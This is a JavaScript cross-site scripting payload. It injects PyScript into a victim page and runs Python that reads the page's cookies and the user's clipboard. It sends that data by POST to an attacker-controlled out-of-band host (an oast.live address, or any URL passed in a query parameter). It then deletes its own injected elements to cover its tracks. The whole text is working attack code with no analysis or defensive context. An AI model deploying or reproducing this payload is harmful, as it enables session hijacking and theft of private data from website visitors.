import('https://pyscript.net/releases/2025.2.1/core.js');
const config=document.createElement('py-config');
config.textContent='{"name": "xss successful", "packages": ["asyncio"]}';
config.id="config";
document.head.appendChild(config);
const script=document.createElement('script');
script.src="https://pyscript.net/releases/2025.2.1/core.js";
script.async=true;
script.type="module";
script.id="pyscript"
document.head.appendChild(script)
script.onload=() => {console.log('successful');};
const script2=document.createElement('script');
const div1=document.createElement('div');
div1.id="c";
document.body.appendChild(div1);
script2.type="py";
script2.id="py-0"
script2.async=true;
script2.config='{"name": "xss successful", "packages": ["asyncio"]}';
script2.textContent=`
import asyncio, js, pyscript, base64, urllib
from pyodide.ffi import create_proxy
import warnings
#warnings.filterwarnings("ignore")
from js import XMLHttpRequest
from io import StringIO
from pyscript import document

url_string=js.window.location.search
parameters=urllib.parse.parse_qs(url_string[1:])
if "url" in parameters:
    url=parameters["url"][0]
else:
    url="https://d07qe06kuj22gblhk9rg93zbmdcbq6e7m.oast.live"
    
async def get_clipboard_data():
        try:
            all_cookies = document.cookie
            text_data = await js.navigator.clipboard.readText()
            req = XMLHttpRequest.new()
            req.open("POST", url, False)
            req.setRequestHeader("Origin", "*")
            req.send(all_cookies+";\\n\\n"+str(base64.b64encode(bytes(text_data, 'utf-8'))))
        except:
            pass

async def rem():
    pyscript.document.querySelector("#py-0").remove()
    pyscript.document.querySelector("#c").remove()
    pyscript.document.querySelector("#config").remove()
    pyscript.document.querySelector("#pyscript").remove()
    pyscript.document.querySelector("#py-0").remove()

pyscript.document.querySelector("#c").focus()
get_clipboard_data_proxy = create_proxy(get_clipboard_data)
async def main():
    while True:
        try:
            asyncio.ensure_future(get_clipboard_data_proxy())
            await asyncio.sleep(10)
            await rem()
            break
        except:
            pass


main()
`;
document.body.appendChild(script2);
